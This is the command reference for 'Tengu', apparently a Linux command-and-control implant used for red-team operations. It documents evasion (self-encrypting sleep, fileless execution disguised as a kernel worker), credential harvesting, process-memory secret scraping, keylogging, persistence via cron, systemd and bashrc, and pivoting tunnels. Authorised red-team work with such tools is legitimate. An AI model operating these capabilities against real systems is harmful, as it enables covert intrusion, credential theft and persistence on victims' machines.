---
title: Commands
description: Complete reference for all Tengu commands - syntax, options, and usage notes.
---

Arguments in `<angle brackets>` are required; `[square brackets]` are optional.

---

## Sleep

```
sleep <seconds> [jitter%]
```

Sets the beacon interval. Jitter randomises the actual delay: `sleep 60 20` means 60s +/- 20%.

When `sleep > 0` and no tunnels (SOCKS5, rportfwd, TCP pivot) are active, Tengu applies sleep obfuscation and XOR-encrypts its own code pages during the interval.

---

## Identity

### whoami

```
whoami
whoami /all
```

Without `/all`: prints the current username.

With `/all`: full identity dump including uid/euid, gid/egid, all supplementary groups, Linux capabilities, sudo rights, login session, shell, and home directory.

### id

```
id
```

Prints current user, UID, GID, and groups (same format as `/usr/bin/id`).

### env

```
env
```

Lists all environment variables.

### pwd

```
pwd
```

Prints the current working directory.

---

## File system

### ls

```
ls [path]
```

Lists a directory. Defaults to the current working directory. Returns name, type, size, permissions, and last-modified date.

### cd

```
cd <path>
```

Changes the working directory of the implant.

### cat

```
cat <path>
```

Reads and returns the content of a file.

### download

```
download <path>
```

Downloads a file from the target to the operator client.

### upload

```
upload <local-path> <remote-path>
```

Uploads a file from the operator client to the target.

### mkdir

```
mkdir <path>
```

Creates a directory (recursive, equivalent to `mkdir -p`).

### rm

```
rm [-r] <path>
```

Deletes a file. Pass `-r` to delete a directory recursively.

### cp

```
cp <src> <dst>
```

Copies a file.

### chmod

```
chmod <octal> <path>
```

Changes file permissions. Octal notation (e.g. `755`, `644`).

---

## Process management

### ps

```
ps
```

Lists all processes via `/proc` enumeration. Returns PID, PPID, name, and owner.

### kill

```
kill <pid>
```

Sends SIGKILL to the specified process.

---

## Execution

### shell

```
shell <command>
```

Executes a command via `/bin/sh -c`. Captures stdout and stderr.

### memfd

```
memfd <local-elf> [args]
```

Sends a local ELF binary to the agent and executes it entirely in memory using `memfd_create` + `/proc/self/fd/<n>`. Nothing is written to disk on the target.

```
memfd /tools/linpeas.sh
memfd /tools/mimipenguin arg1 arg2
```

The process appears in `/proc` as `kworker/u:0`. Stdout and stderr are captured and returned.

### inline-execute (ELF BOF)

```
inline-execute <bof.x64.o> [args]
```

Loads and executes an ELF relocatable object (`.o`) in the implant process. The Linux equivalent of Cobalt Strike / Havoc BOF execution.

See [ELF BOF](#elf-bof) for the BeaconAPI reference and how to write a BOF.

### screenshot

```
screenshot
```

Captures a screenshot. Tries `scrot`, `grim`, and `import` in order, using whichever is available.

---

## Network recon

### netstat

```
netstat
```

Lists TCP and TCP6 connections parsed from `/proc/net/tcp` and `/proc/net/tcp6`. No external binary required.

### arp

```
arp
```

ARP table from `/proc/net/arp`.

### route

```
route
```

Routing table from `/proc/net/route`.

### ifconfig

```
ifconfig
```

Network interfaces and their addresses.

### portscan

```
portscan <target> <ports> [timeout_ms]
```

TCP connect scan, no external binary. Supports single IPs, CIDR ranges, port lists, and port ranges.

```
portscan 10.0.0.1 22,80,443
portscan 192.168.1.0/24 22,80,443,8080 500
portscan 10.10.10.5 1-1024
```

Default timeout: 500ms per port.

---

## Credential access

### harvest

```
harvest
```

One-shot credential collection. No arguments. Scans:

- SSH private keys (`~/.ssh/id_*`) and config
- Shell history: bash, zsh, fish
- Cloud tokens: AWS (`~/.aws/credentials`), GCP, Azure
- Git credentials: `~/.git-credentials`, `~/.gitconfig`
- Docker registry auth: `~/.docker/config.json`
- Kubernetes config: `~/.kube/config`
- Database credentials: `~/.pgpass`, `~/.netrc`, `~/.mysql_history`
- Package manager tokens: `~/.npmrc`, pip config
- `/etc/shadow` (if readable - root sessions)
- Environment variables matching credential-related keywords

### procdump

```
procdump [pid|all]
```

Reads `/proc/<pid>/mem` directly (no ptrace, no process pause) and scans readable memory regions for credential patterns: passwords, secrets, tokens, AWS keys, JWTs, PEM blocks, Authorization headers.

```
procdump 1234      # scan a specific PID
procdump all       # scan all accessible processes
```

Access to other users' processes requires root or `ptrace_scope=0`. Reading your own processes always works.

### keylog

```
keylog [seconds]
```

Captures keystrokes for N seconds. Default: 30 seconds.

```
keylog 60
keylog        # 30s default
```

Tries `/dev/input/eventX` first (requires `input` group or root). Falls back to X11 via `dlopen("libX11.so.6")` - works for any user with a graphical session without recompiling.

---

## Persistence

```
persist cron <path> [interval]
persist systemd <path>
persist bash <path>
```

| Method | Description |
|---|---|
| `cron` | Adds a crontab entry. Default interval: `*/5 * * * *` |
| `systemd` | Creates a `.service` unit. Root: `/etc/systemd/system/`, user: `~/.config/systemd/user/` |
| `bash` | Appends a `nohup` launch entry to `~/.bashrc` (dedup-safe) |

---

## Privilege escalation recon

```
privesc
```

One-shot local privilege escalation survey. No arguments. Checks:

- **SUID/SGID binaries** - scans `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`, `/usr/local/bin`
- **sudo -l** - sudo rules for the current user (non-interactive, no password prompt)
- **Writable PATH directories** - checks every `$PATH` entry for world-writable permissions
- **Process capabilities** - reads `CapEff` from `/proc/<pid>/status` for all accessible processes

Cross-reference results with [GTFOBins](https://gtfobins.github.io/).

---

## Reverse port forwarding

```
rportfwd add <bind_port> <internal_host> <internal_port>
rportfwd list
rportfwd rm <bind_port>
```

The teamserver opens a TCP listener on `bind_port`. Incoming connections are forwarded through the C2 channel to `internal_host:internal_port` on the target network.

```
# Expose an internal SSH server
rportfwd add 2222 192.168.10.5 22
ssh -p 2222 user@<teamserver_ip>

# Expose an internal web app
rportfwd add 8080 10.0.0.100 80
```

Multiple rules can be active simultaneously. Each rule supports multiple concurrent connections.

---

## Networking

### socks5

```
socks5 start [port]
socks5 stop
```

Starts or stops a SOCKS5 proxy server tunnelled through the C2 channel. Default port: `1080`.

---

## TCP pivot

```
pivot tcp listen <port>
```

Opens a TCP server on the agent host that accepts connections from child Tengu agents compiled with the TCP transport. Once connected, the teamserver routes traffic for the child through this agent's C2 session.

---

## Other

| Command | Description |
|---|---|
| `info` | Local session info (no round-trip to teamserver) |
| `task list` | List pending tasks |
| `task clear` | Clear pending task queue |
| `help` | Print command list |
| `exit` | Terminate the agent |

---

## ELF BOF

Tengu executes x86_64 ELF relocatable objects (`.o`) in-process via `inline-execute`.

### BeaconAPI

| Function | Description |
|---|---|
| `BeaconPrintf(type, fmt, ...)` | Print formatted output |
| `BeaconOutput(type, data, len)` | Output raw bytes |
| `BeaconDataParse(parser, data, len)` | Initialize a data parser |
| `BeaconDataExtract(parser, &len)` | Extract next string |
| `BeaconDataInt(parser)` | Extract next 4-byte int |
| `BeaconDataShort(parser)` | Extract next 2-byte short |
| `BeaconFormatAlloc(fmt, max)` | Allocate a format buffer |
| `BeaconFormatPrintf(fmt, ...)` | Append formatted string |
| `BeaconFormatFree(fmt)` | Free format buffer |
| `BeaconFormatToString(fmt, &len)` | Get format buffer as string |
| `BeaconIsAdmin()` | Returns 1 if running as root |

Unknown symbols fall through to `dlsym(RTLD_DEFAULT)` - libc and any library loaded in the process are available without linking.

### Writing a BOF

```c
#include "beacon.h"

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char* target = BeaconDataExtract(&parser, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "Target: %s\n", target);
}
```

```bash
gcc -c -o mybof.x64.o mybof.c
```
